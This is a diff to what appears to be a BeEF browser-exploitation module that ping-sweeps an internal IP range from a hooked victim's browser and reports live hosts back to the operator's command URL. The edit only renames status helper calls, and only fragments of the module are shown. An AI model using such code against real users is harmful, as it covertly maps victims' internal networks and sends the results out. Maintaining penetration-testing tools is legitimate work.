@@ -12,7 +12,7 @@ beef.execute(function() {
   var timeout = 1000;
 
   if(!beef.browser.hasCors()) {
-    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support CORS', beef.are.status_error());
+    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support CORS', beef.status.error());
     return;
   }
 
@@ -41,7 +41,7 @@ beef.execute(function() {
     // set target IP range
     var range = rhosts.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
     if (range == null || range[1] == null) {
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.are.status_error());
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.status.error());
       return;
     }
     ipBounds   = rhosts.split('-');
@@ -96,7 +96,7 @@ beef.execute(function() {
           'var duration = current_time - start_time;' +
           'if (duration < '+timeout+') {' +
             'beef.debug("[Ping Sweep] '+ip+' [" + duration + " ms] -- host is up");' +
-            'beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip='+ip+'&ping="+duration+"ms", beef.are.status_success());' +
+            'beef.net.send("<%= @command_url %>", <%= @command_id %>, "ip='+ip+'&ping="+duration+"ms", beef.status.success());' +
           '} else {' +
             'beef.debug("[Ping Sweep] '+ip+' [" + duration + " ms] -- timeout");' +
           '}' +
